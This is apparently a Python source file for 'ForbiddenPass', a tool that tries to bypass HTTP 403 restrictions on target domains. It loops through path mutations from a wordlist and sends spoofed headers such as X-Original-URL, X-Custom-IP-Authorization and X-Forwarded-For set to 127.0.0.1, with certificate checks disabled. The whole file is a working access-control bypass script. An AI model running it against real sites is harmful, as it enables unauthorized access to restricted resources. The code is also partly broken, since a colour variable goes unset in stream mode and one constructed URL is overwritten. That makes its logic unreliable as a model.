from colorama import Fore, Back, Style
from fake_useragent import UserAgent
import multiprocessing
import requests
import argparse
import sys
import json
import warnings
warnings.filterwarnings("ignore")
banner = r"""


___________         ___.   .__    .___  .___           __________
\_   _____/_________\_ |__ |__| __| _/__| _/____   ____\______   \_____    ______ ______
 |    __)/  _ \_  __ \ __ \|  |/ __ |/ __ |/ __ \ /    \|     ___/\__  \  /  ___//  ___/
 |     \(  <_> )  | \/ \_\ \  / /_/ / /_/ \  ___/|   |  \    |     / __ \_\___ \ \___ \
 \___  / \____/|__|  |___  /__\____ \____ |\___  >___|  /____|    (____  /____  >____  >
     \/                  \/        \/    \/    \/     \/               \/     \/     \/   v1.0
by c0d3Ninja, MrPMillz

"""

print(Fore.CYAN + banner)

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

group.add_argument('-p', '--path', action='store',
                   type=str, help='path to check',
                   metavar='domain.com')

parser.add_argument('-d', '--domains', action='store',
                    help="domains to check",
                    metavar="filename.txt")

parser.add_argument('-t', '--target', action='store',
                    help="domain to check",
                    metavar="site.com")


parser.add_argument('-u', '--user', action='store',
                    help="username",
                    metavar="admin")


parser.add_argument('-w', '--password', action='store',
                    help="password",
                    metavar="password")


args = parser.parse_args()

ua = UserAgent()


def word_list(wordlist: str) -> list:
    try:
        with open(wordlist, 'r') as f:
            _wordlist = [x.strip() for x in f.readlines()]
        return _wordlist
    except FileNotFoundError as fnf_err:
        print(f"FileNotFoundError: {fnf_err}")
        sys.exit(1)


def header_bypass(path=None):
    headers = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Original-URL': path if path else '/'},
        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'}
    ]
    return headers


def do_request(url: str, stream=False, path=None):
    if path:
        headers = header_bypass(path=path)
    else:
        headers = header_bypass()
    try:
        for header in headers:
            if stream:
                if args.user:
                    r = requests.get(url, stream=True, headers=header,verify=False, auth=(args.user,args.password))
                else:
                    r = requests.get(url, stream=True, headers=header,verify=False)
            else:
                if args.user:
                    r = requests.get(url, headers=header,verify=False, auth=(args.user,args.password))
                else:
                    r = requests.get(url, headers=header,verify=False)
                if r.status_code == 200:
                    color = Fore.LIGHTYELLOW_EX
                else:
                    color = Fore.WHITE
            print(color + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.GREEN + " [{}]".format(r.status_code))
    except requests.exceptions.ConnectionError as ce_error:
        print("Connection Error: ", ce_error)
        pass
    except requests.exceptions.Timeout as t_error:
        print("Connection Timeout Error: ", t_error)
        pass
    except requests.exceptions.RequestException as req_err:
        print("Some Ambiguous Exception:", req_err)
        pass


def main():
    bypass_list = word_list('bypasses.txt')
    if args.domains:
        if args.path:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = word_list(args.domains)
            for lines in checklist:
                for bypass in bypass_list:
                    links = lines + "/" + args.path + bypass                    
                    do_request(links, stream=True, path=args.path)
        else:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = word_list(args.domains)
            for lines in checklist:
                for bypass in bypass_list:
                    links = lines + bypass
                    do_request(links, stream=True)
    if args.target:
        if args.path:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in bypass_list:
                links = args.target + "/" + args.path + bypass
                links = args.target + "/" + bypass + args.path
                do_request(links, path=args.path)

        else:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in bypass_list:
                links = args.target + bypass
                do_request(links)

processes = []
for _ in range(1):
    process = multiprocessing.Process(target=main)
    process.start()
    processes.append(process)
for process in processes:
    process.join()
